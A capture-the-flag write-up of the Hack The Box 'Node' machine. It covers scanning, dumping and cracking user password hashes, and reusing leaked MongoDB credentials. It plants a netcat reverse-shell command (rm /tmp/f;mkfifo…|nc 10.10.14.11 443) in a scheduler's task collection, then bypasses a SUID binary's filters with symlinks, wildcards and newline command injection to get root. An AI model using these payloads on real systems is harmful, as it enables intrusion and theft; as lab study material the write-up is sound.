We start it off with nmap:
```
nmap -v -sC -sV -oA nmap -Pn 10.10.10.58
```
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (EdDSA)
3000/tcp open  http    Node.js Express framework
| hadoop-datanode-info: 
|_  Logs: /login
|_hadoop-jobtracker-info: 
| hadoop-tasktracker-info: 
|_  Logs: /login
|_hbase-master-info: 
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH and a webserver nice. The nodejs MyPlace blog looks like a couple users and a login form with nothing much else at this point.

![](pics/nodemyplace.JPG)

So we run dirsearch against the nodejs site and get a bunch of 200 responses for everything in our wordlist, something seems wrong. If we use dirbuster or gobuster it gets blacklisted based on the default user agents and we get an ascii art troll face and some base64 that is garbage back in the response. We can see this clearer if we proxy the brute forcing through burp or use curl.
```bash 
root@sushi:~/hackthebox/node# curl -H 'User-Agent: Dirbuster' 10.10.10.58:3000                                                                                                                               
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ                                                                                                                                  
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ                                                                                                                                  
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ                                                                                                                                  QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ                                                                                                                                  
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
QQQQQP'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
QQ[ j@mQP'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQDQf(.QWQQ
QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ


<!-- UzKbQ9iCpuYXcA2iJ6ULHq1M3qKIo9UCc9oa8gP39T08j0v1Qw8aAXrTRbi2JYAgdds1m6sYF3J9408UwecJDOaebvQcGDwU4eGwkQ9x4SUN2O9mE5SBhTyhKH2RgXjL03pcVnzw0n6wjf08BpQI1PDsphFyHO4aRkXEFIVObU3qMBuWXmy6qOagQcJu87KLV0CX7SI$
```

So with those tools being a pain we can try using the site map in burp and spider the host. At /api/users/latest and we can see the 3 accounts on the blog and some hashes. None of these are marked "is_admin".
```javascript
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 449
ETag: W/"1c1-uNG6P2Gk3GDSM3qIsuNDtGcTJkk"
Date: Fri, 21 Jun 2019 20:37:44 GMT
Connection: close


[{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
```

Looks like sha-256 then we can crack this on our hashcat rig.
```bash 
root@sushi:~# hashid f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
Analyzing 'f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256) 
```

So we fire these up on an ancient Windows machine.
```bash
C:\Users\740i\Documents\hashcat-3.40>hashcat64.exe -a 0 -m 1400 hash.txt rockyou.txt
hashcat (v3.40) starting...

OpenCL Platform #1: Advanced Micro Devices, Inc.
================================================
* Device #1: AMD Phenom(tm) II X4 965 Processor, 24574/24574 MB allocatable, 4MCU

Hashes: 3 digests; 3 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable Optimizers:
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

Watchdog: Hardware Monitoring Interface not found on your system
Watchdog: Temperature abort trigger disabled
Watchdog: Temperature retain trigger disabled

Cache-hit dictionary stats rockyou.txt: 139921507 bytes, 14343297 words, 14343297 keyspace

f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
```
We can't crack the rastating users password with just rockyou, but we can login as mark and tom with these other passwords but it gets us nothing since we're not an admin user.




Back to looking at the burp sitemap, we notice a few more paths on the webserver that could be interesting.
```bash
root@sushi:~# curl http://10.10.10.58:3000/assets/js/app/app.js
var controllers = angular.module('controllers', []);
var app = angular.module('myplace', [ 'ngRoute', 'controllers' ]);

app.config(function ($routeProvider, $locationProvider) {
  $routeProvider.
    when('/', {
      templateUrl: '/partials/home.html',
      controller: 'HomeCtrl'
    }).
    when('/profiles/:username', {
      templateUrl: '/partials/profile.html',
      controller: 'ProfileCtrl'
    }).
    when('/login', {
      templateUrl: '/partials/login.html',
      controller: 'LoginCtrl'
    }).
    when('/admin', {
      templateUrl: '/partials/admin.html',
      controller: 'AdminCtrl'
    }).
    otherwise({
      redirectTo: '/'
    });

    $locationProvider.html5Mode(true);
});
```

http://10.10.10.58:3000/partials/admin.html takes us to some kind of backup download page, but we need to be admin user of course for it to do much. 

![](pics/downloadbackup.PNG)



Later we go back to just /api/users it seems to list the admin account and his hash along with the others this time:
```bash
root@sushi:~/hackthebox/node# curl 10.10.10.58:3000/api/users
[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
```


So let's run that one new hash through hashcat:

```bash
C:\Users\740i\Documents\hashcat-3.40>hashcat64.exe -a 0 -m 1400 dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af rockyou.txt
---snip---
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
```
Awesome then we can login as myP14ceAdm1nAcc0uNT:manchester now and checkout the backup page. All we can do actually is download the "myplace.backup" file from this page. It looks like a 3.3 meg file that is base64 encoded. After awhile we try and convert it to different types of archives.

```bash 
root@sushi:~/hackthebox/node# strings myplace.backup | base64 -d > test.zip
```
Cool so its an actual zip file now but we still cant open it.
```bash
root@sushi:~/hackthebox/node# unzip test.zip 
Archive:  test.zip
[test.zip] var/www/myplace/package-lock.json password: 
password incorrect--reenter: 
```
We can try using fcrackzip with rockyou.txt again. Once we open it with "magicword" it seems to be a full backup of the myplace blog.
```bash
root@sushi:~/hackthebox/node# fcrackzip test.zip -D -u -p /usr/share/wordlists/rockyou.txt 


PASSWORD FOUND!!!!: pw == magicword
```
If we look at app.js from this backup we can see mark's mongodb creds in the source:
```javascript 
const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```
You can also see the user agent blacklisting and the random garbage base64 that was happening earlier:
```javascript 
MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  app.use(function (req, res, next) {
    var agent = req.headers['user-agent'];
    var blacklist = /(DirBuster)|(Postman)|(Mozilla\/4\.0.+Windows NT 5\.1)|(Go\-http\-client)/i;
    
    if (!blacklist.test(agent)) {
      next();
    }
    else {
      count = Math.floor((Math.random() * 10000) + 1);
      randomString = '';

      var charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      for (var i = 0; i < count; i++)
        randomString += charset.charAt(Math.floor(Math.random() * charset.length));

      res.set('Content-Type', 'text/plain').status(200).send(
        [
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQP\'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ',
          'QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ',
          'QQQQQQQQQQW\' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ',
          'QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ',
          'QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ',
          'QQQQQQQP\'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ',
          'QQQQQP\'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP\'    "??\' =QQmWWV?46/ ?QQQQQ',
          'QQQP\'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ',
          'QQ[ j@mQP\'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ',
          'QW jQkQ@ jWQQD\'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ',
          'QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ',
          'QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ',
          'QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\'<mWWWWWQW?^  ` ]6QQ\' yQQQQQ',
          'QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ',
          'QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ',
          'QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ',
          'QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ',
          'QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ\'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ',
          'QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ',
          'QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ',
          'QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ',
          'QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ',
          'QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ',
          'QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW',
          'QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ',
          'QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ',
          'QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ',
          '',
          '',
          '<!-- ' + randomString + ' -->'
        ].join("\n")
      );
```

So we try to ssh in as mark with his mongo creds and it works. We start to check around the machine and see there is a suspect looking SUID binary here at /usr/local/bin/backup but we dont have permissions to run it right now. The other account on the box tom is in the admin group and running this /var/scheduler thing:
```bash
mark@node:/var/backups$ groups tom
tom : tom adm cdrom sudo dip plugdev lpadmin sambashare admin
mark@node:/var/backups$ ps aux | grep tom
tom       1217  0.0  6.5 1022184 49328 ?       Ssl  Jun21   0:11 /usr/bin/node /var/www/myplace/app.js
tom       1223  0.0  6.1 1074616 46960 ?       Ssl  Jun21   0:11 /usr/bin/node /var/scheduler/app.js
mark     16278  0.0  0.1  14228   992 pts/0    S+   01:16   0:00 grep --color=auto tom
```
Taking a quick glance it seems to be some kind of task scheduler javascript code:
```javascript 
mark@node:/var/backups$ cat /var/scheduler/app.js 
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```
So its looking through each document in a mongo collection "tasks" and then executing whatever is in the cmd field which is empty here. We should be able to login to the mongodb as mark and add our own document to the tasks collection with a command or reverse shell in it:

```bash
mark@node:/tmp$ mongo                              
MongoDB shell version: 3.2.16          
connecting to: test
> use scheduler 
switched to db scheduler
> db.auth('mark','5AYRft73VtFpc84k')
1
> db.tasks.insert( { cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 443 >/tmp/f" } )
WriteResult({ "nInserted" : 1 })
>
```
Sick so after that we get a shell back as tom this time:
```bash 
root@sushi:~# nc -nlvp 443                        
listening on [any] 443 ...                        
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.58] 39036                                           
/bin/sh: 0: can't access tty; job control turned off                                                  
$ id                                               
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

Let's check out that SUID backup binary from before:
```bash
$ find / -perm -4000 -exec ls -al -print 2>/dev/null {} \;
259267 -rwsr-xr-x 1 0 0 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
297906 -rwsr-xr-x 1 0 0 81672 Jul 17  2017 /usr/lib/snapd/snap-confine
278211 -rwsr-xr-- 1 0 111 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
278959 -rwsr-xr-x 1 0 0 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
17884 -rwsr-xr-x 1 0 0 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
282088 -rwsr-xr-x 1 0 0 14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
303364 -rwsr-xr-- 1 0 1002 16484 Sep  3  2017 /usr/local/bin/backup
---snip---
```
So back in the /var/www/myplace/app.js source we can see this backup binary being called with its backup_key parameter, then encoding a directory as a base64 zip file.
```javascript
$ less /var/www/myplace/app.js | grep -i backup
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
  app.get('/api/admin/backup', function (req, res) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
        backup += chunk;
```
Let's see if we can backup something more valuable. If we try and do the /root directory or /etc/shadow, we just get the ascii art troll face again as a base64'd zip file.
```bash
tom@node:~$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
                      
 [+] Finished! Encoded backup is below:

UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

Not really sure what's going on here, so we run ltrace while trying to backup something else, in this case the machines user.txt. At that point we can see a bunch of string comparisons for /root, /etc, and other useful special characters.

```bash
strstr("/home/tom/user.txt", "..")               = nil
strstr("/home/tom/user.txt", "/root")            = nil
strchr("/home/tom/user.txt", ';')                = nil
strchr("/home/tom/user.txt", '&')                = nil
strchr("/home/tom/user.txt", '`')                = nil
strchr("/home/tom/user.txt", '$')                = nil
strchr("/home/tom/user.txt", '|')                = nil
strstr("/home/tom/user.txt", "//")               = nil
strcmp("/home/tom/user.txt", "/")                = 1
strstr("/home/tom/user.txt", "/etc")             = nil
```
And here in ltrace you can see it zipping up everything with the magicword password:
```bash
sprintf("/usr/bin/zip -r -P magicword /tm"..., "/usr/bin/zip -r -P magicword %s "..., "/tmp/.backup_1300558386", "/home/tom/user.txt") = 83
system("/usr/bin/zip -r -P magicword /tm"... <no return ...>
```


So the first way I can think of to defeat this filtering is to create a symbolic link to root.txt somewhere and run the backup binary on it:
```bash
tom@node:/tmp/.backup$ ln -s /root/root.txt /tmp/.backup/blah.txt

tom@node:/tmp/.backup$ backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/.backup/blah.txt | base64 -d > root.zip

tom@node:/tmp/.backup$ unzip root.zip
Archive:  root.zip
[root.zip] tmp/.backup/blah.txt password: magicword
```



Another method is to use wildcards and get any file we want. /r???/r???.txt also works here.

```bash
tom@node:/tmp.backup$ backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "/r**t/r**t.txt" | base64 -d > wildcard.zip

tom@node:/tmp/.backup$ unzip wildcard.zip
unzip wildcard.zip
Archive:  wildcard.zip
[wildcard.zip] root/root.txt password: magicword
```
I would think you can use backslashes as they're not being checked for and maybe other special characters or encodings to get past this, but it doesn't really feel like a win until we get an actual shell as root. One way to do that is using a printf statement and newline characters to execute a command: 

```bash
tom@node:/tmp$ backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'aaa\n/bin/sh\nls')"
<0afc3d98a8d0230167104d474 "$(printf 'aaa\n/bin/sh\nls')"                    
        zip warning: name not matched: aaa

zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_612162143 . -i aaa)
# id
id
uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
 ```
So I hear the intended way to get root on the box is to actually write an exploit for the backup binary which is also compiled with ASLR and other mitigations. I have not looked into this but will for sure sometime when the machine is active again on HTB. Thanks for creating this one @rastating had a lot of fun working through it.










